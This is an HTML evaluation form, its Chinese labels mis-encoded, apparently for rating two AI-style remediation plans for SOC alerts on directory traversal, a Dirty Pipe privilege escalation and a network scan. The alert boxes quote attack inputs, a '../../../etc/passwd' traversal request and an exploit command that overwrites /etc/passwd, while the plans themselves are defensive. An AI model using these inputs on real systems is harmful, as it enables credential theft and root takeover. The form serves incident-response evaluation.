                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(2)" >â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(2)">ä¸‹ä¸€ä¸ª â†’</button>
    </div>
</div>

<div class="case-panel" id="case-3">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #3: Case07_ç›®å½•éå†</h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘ç›®å½•éå†æ”»å‡»æ£€æµ‹
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 13:00:00
ã€æ”»å‡»æºIPã€‘185.220.101.50
ã€ç›®æ ‡IPã€‘192.168.2.100
ã€ç›®æ ‡ç«¯å£ã€‘80
ã€å¨èƒç­‰çº§ã€‘é«˜å±
ã€æ”»å‡»ç±»å‹ã€‘ç›®å½•éå†
ã€ATT&amp;CKã€‘å‡­è¯è®¿é—®:TA0006|ä¸å®‰å…¨çš„å‡­è¯:T1552
ã€è¯·æ±‚URIã€‘/download?file=../../../etc/passwd
ã€Payloadã€‘../../../etc/passwd
ã€å‘Šè­¦æè¿°ã€‘æ£€æµ‹åˆ°ç›®å½•éå†æ”»å‡»ï¼Œæ”»å‡»è€…å°è¯•é€šè¿‡è·¯å¾„ç©¿è¶Šè¯»å–Linuxç³»ç»Ÿçš„/etc/passwdæ–‡ä»¶ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚
ã€å¤„ç½®å»ºè®®ã€‘å¯¹æ–‡ä»¶è·¯å¾„è¿›è¡Œè§„èŒƒåŒ–å¤„ç†ï¼Œé™åˆ¶æ–‡ä»¶è®¿é—®èŒƒå›´ï¼Œä½¿ç”¨ç™½åå•æœºåˆ¶</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>1. ç¡®è®¤webæœåŠ¡å™¨æ—¥å¿—ä¸­å­˜åœ¨å¼‚å¸¸è®¿é—®è®°å½•ï¼Œ"/download?file=../../../etc/passwd"ï¼Œå¹¶ç•™å­˜è¯æ®ã€‚
2. æ£€æŸ¥å¹¶ä¿®å¤å­˜åœ¨ç›®å½•éå†æ¼æ´çš„æ–‡ä»¶ä¸‹è½½åŠŸèƒ½æºä»£ç ï¼Œå¯¹"file"å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå»é™¤"../"ç­‰å±é™©å­—ç¬¦ã€‚
3. é™å®šç”¨æˆ·åªèƒ½è®¿é—®æŒ‡å®šç™½åå•ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œé˜²æ­¢è¶Šæƒã€‚
4. å»ºè®®ç«‹å³å‡çº§Webåº”ç”¨ã€ç›¸å…³ä¾èµ–åŠä¸­é—´ä»¶è‡³æœ€æ–°ç‰ˆæœ¬ã€‚
5. å®šæœŸè¿›è¡Œæ¼æ´æ‰«æå’Œä»£ç å®¡è®¡ï¼Œæ’æŸ¥å…¶ä»–è¾“å…¥å‚æ•°å­˜åœ¨çš„ç›®å½•éå†é£é™©ã€‚
6. ä¸»åŠ¨é˜»æ–­æ”»å‡»æºIPï¼šiptables -A INPUT -s 185.220.101.50 -j DROP</pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>1. ã€è¯æ®å½’é›†ã€‘
   - å¼‚å¸¸è¯·æ±‚æŠ“å–ï¼š/download?file=../../../etc/passwd
   - æ”»å‡»æºIPï¼š185.220.101.50
   - å¨èƒæƒ…æŠ¥ï¼šé«˜é£é™©TORå‡ºå£èŠ‚ç‚¹ï¼ˆä¸å¼€æºæƒ…æŠ¥å»åˆï¼‰
   - ATT&CKé“¾è·¯ï¼šTA0006ï¼ˆå‡­è¯è®¿é—®ï¼‰ã€T1552ï¼ˆä¸å®‰å…¨çš„å‡­è¯ï¼‰
   - å…³è”IOCï¼šæ— æ˜æ˜¾å¸¦æ¯’Hashã€æš‚æ— CVEç¼–å·ï¼Œä½†ç¬¦åˆç»å…¸ç›®å½•éå†åˆ©ç”¨æ¨¡å¼

2. ã€å°ç¦ä¸ç›‘æ§ã€‘
   - ä¸´æ—¶æ‹‰é»‘æºIPï¼ˆ5åˆ†é’Ÿæœ‰æ•ˆï¼Œä¾¿äºå›é€€ï¼‰
     ```bash
     iptables -I INPUT -s 185.220.101.50 -j DROP
     ```
   - æ—¥å¿—ç›‘æ§å‘½ä»¤ï¼ˆæ’æŸ¥åŒæºåç»­è¡Œä¸ºï¼‰
     ```bash
     grep '185.220.101.50' /var/log/nginx/access.log
     ```
   - æ ‡è®°æ­¤äº‹ä»¶ä¸º"éœ€å…³æ³¨"ï¼Œè‡ªåŠ¨æ·»åŠ ç›‘æ§å‘Šè­¦ç­–ç•¥

3. ã€WebæœåŠ¡åº”æ€¥æªæ–½ã€‘
   - æ£€æŸ¥/download GETæ¥å£å¤„ç†é€»è¾‘ï¼Œå¢åŠ å¦‚ä¸‹ä¼ªä»£ç æ ¡éªŒæ‹¦æˆªï¼š
     ```python
     import os
     filename = request.args.get('file')
     if ".." in filename or filename.startswith("/"):
         abort(400)
     # æˆ–ï¼šåªå…è®¸ç™½åå•ç›®å½•
     allowed_dir = "/var/www/download"
     path = os.path.realpath(os.path.join(allowed_dir, filename))
     if not path.startswith(allowed_dir):
         abort(403)
     ```
   - åº”ç”¨æ›´æ”¹å‰å»ºè®®å¤‡ä»½ç›¸å…³é…ç½®åŠæºä»£ç ã€‚
   - å˜æ›´å›é€€å‘½ä»¤ï¼š
     ```bash
     iptables -D INPUT -s 185.220.101.50 -j DROP
     ```
   - æ‰§è¡Œå‰Pre-checkï¼š
     - æ£€æŸ¥iptablesæ˜¯å¦å·²å­˜åœ¨ç›¸å…³è§„åˆ™ï¼Œé¿å…é‡å¤æ’å…¥ï¼›
     - éªŒè¯Nginxæ—¥å¿—æ˜¯å¦å·²å®Œæ•´ä¿ç•™ï¼›
     - è¯„ä¼°ä¿®å¤æªæ–½å¯¹ç°æœ‰ä¸šåŠ¡æ–‡ä»¶ä¸‹è½½æµç¨‹çš„å½±å“ã€‚

4. ã€é•¿æœŸå»ºè®®ã€‘
   - å¼•ç”¨OWASP Top 10 2021-A5 "å®‰å…¨é…ç½®ç¼ºé™·"ä¸A1 "æ³¨å…¥"ï¼Œä¸Šçº¿ä»£ç å®¡è®¡å·¥å…·ã€‚
   - å»ºè®®å¯ç”¨WAFç›®å½•ç©¿è¶Šæ£€æµ‹è§„åˆ™ï¼ˆå¦‚ModSecurityï¼‰ï¼Œå¹¶æŒç»­è¿½è¸ªæœ€æ–°å®‰å…¨å…¬å‘Š/è¡¥ä¸ã€‚</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(3)" >â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(3)">ä¸‹ä¸€ä¸ª â†’</button>
    </div>
</div>

<div class="case-panel" id="case-4">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #4: Case12_DirtyPipeææƒ</h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘Linuxæœ¬åœ°ææƒæ”»å‡»
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 15:30:00
ã€å—å½±å“ä¸»æœºã€‘192.168.5.100
ã€å½“å‰ç”¨æˆ·ã€‘www-data
ã€å¨èƒç­‰çº§ã€‘ä¸¥é‡
ã€æ”»å‡»ç±»å‹ã€‘æƒé™æå‡
ã€æ¼æ´ç±»å‹ã€‘CVE-2022-0847
ã€ATT&amp;CKã€‘æƒé™æå‡:TA0004|åˆ©ç”¨æ¼æ´ææƒ:T1068
ã€å¯ç–‘è¿›ç¨‹ã€‘/tmp/.exploit_dp
ã€å¯ç–‘å‘½ä»¤ã€‘./exploit_dp /etc/passwd 1 ootz:
ã€å‘Šè­¦æè¿°ã€‘æ£€æµ‹åˆ°Dirty Pipeæ¼æ´åˆ©ç”¨å°è¯•ï¼Œä½æƒé™ç”¨æˆ·www-dataæ­£åœ¨å°è¯•é€šè¿‡CVE-2022-0847è¦†å†™/etc/passwdæ–‡ä»¶ä»¥è·å–rootæƒé™ã€‚
ã€å¤„ç½®å»ºè®®ã€‘ç«‹å³ç»ˆæ­¢æ¶æ„è¿›ç¨‹ï¼Œå‡çº§å†…æ ¸åˆ°5.16.11+ï¼Œæ£€æŸ¥/etc/passwdæ˜¯å¦è¢«ç¯¡æ”¹</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>1. ç»ˆæ­¢å¯ç–‘è¿›ç¨‹ï¼š
   ```bash
   kill -9 $(pgrep -f '/tmp/.exploit_dp')
   ```
2. æ£€æŸ¥ /etc/passwd æ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹ï¼š
   ```bash
   grep '^root:' /etc/passwd
   ```
3. å‡çº§å†…æ ¸ï¼š
   - ä¸‹è½½å¹¶å®‰è£…æœ€æ–°çš„å†…æ ¸è¡¥ä¸ï¼Œå»ºè®®å‡çº§åˆ°5.16.11ä»¥ä¸Šç‰ˆæœ¬ã€‚
4. å»ºè®®æ‰§è¡Œä¸»æœºå…¨é¢æ€æ¯’å’Œå¼‚å¸¸è´¦æˆ·æ’æŸ¥ã€‚</pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>1. æ‰§è¡Œå‰æ£€æŸ¥ï¼ˆPre-checkï¼‰ï¼š
   - æ£€æŸ¥å½“å‰ /etc/passwd æ˜¯å¦å­˜åœ¨å¼‚å¸¸ root è´¦å·ï¼š
     ```bash
     grep '^[^:]*:.*:0:0:' /etc/passwd
     ```
   - æ ¡éªŒ /etc/passwd æ–‡ä»¶å“ˆå¸Œå€¼ï¼ˆå¦‚æœ‰åŸºçº¿ï¼‰ï¼š
     ```bash
     sha256sum /etc/passwd
     ```
2. ç»ˆæ­¢æ¶æ„è¿›ç¨‹ï¼š
   ```bash
   pkill -f '/tmp/.exploit_dp'
   ```
3. ä¸´æ—¶éš”ç¦»å—å½±å“ç”¨æˆ·ï¼ˆwww-dataï¼‰ï¼š
   ```bash
   usermod -L www-data
   ```
4. æ£€æŸ¥å¹¶è¿˜åŸ /etc/passwdï¼ˆå¦‚æœ‰å¤‡ä»½ï¼‰ï¼š
   ```bash
   cp /var/backups/passwd.bak /etc/passwd
   ```
   - è‹¥æ— å¤‡ä»½ï¼Œæ‰‹å·¥æ¯”å¯¹rootæ¡ç›®ï¼ŒåŠæ—¶ä¿®å¤
5. å‡çº§Linuxå†…æ ¸ï¼š
   - Ubuntu/Debianï¼š
     ```bash
     apt update && apt install --only-upgrade linux-image-$(uname -r)
     ```
   - CentOS/RHELï¼š
     ```bash
     yum update kernel
     ```
   - é‡å¯æœåŠ¡å™¨ä½¿è¡¥ä¸ç”Ÿæ•ˆ
6. å›é€€æªæ–½ï¼ˆRollbackï¼‰ï¼š
   - è‹¥å› éš”ç¦»å½±å“ä¸šåŠ¡ï¼Œå¯æ¢å¤è´¦æˆ·ï¼š
     ```bash
     usermod -U www-data
     ```
7. æ£€æŸ¥å¼‚å¸¸ç™»å½•å’Œåå‘Shellå†å²ï¼Œæ’æŸ¥åé—¨
8. è®°å½•å–è¯ï¼Œå¦‚ä¿å­˜è¢«ç¯¡æ”¹çš„ /etc/passwd ä»¥ä¾¿æº¯æº</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(4)" >â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(4)">ä¸‹ä¸€ä¸ª â†’</button>
    </div>
</div>

<div class="case-panel" id="case-5">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #5: Case17_æ¼æ´æ‰«æ</h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘å¤§è§„æ¨¡æ¼æ´æ‰«ææ£€æµ‹
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 18:00:00
ã€æ”»å‡»æºIPã€‘185.220.100.250
ã€ç›®æ ‡ç½‘æ®µã€‘192.168.0.0/16
ã€æ‰«æç«¯å£ã€‘22,80,443,3306,6379,27017
ã€å¨èƒç­‰çº§ã€‘ä¸­å±
ã€æ”»å‡»ç±»å‹ã€‘æ¶æ„æ‰«æ
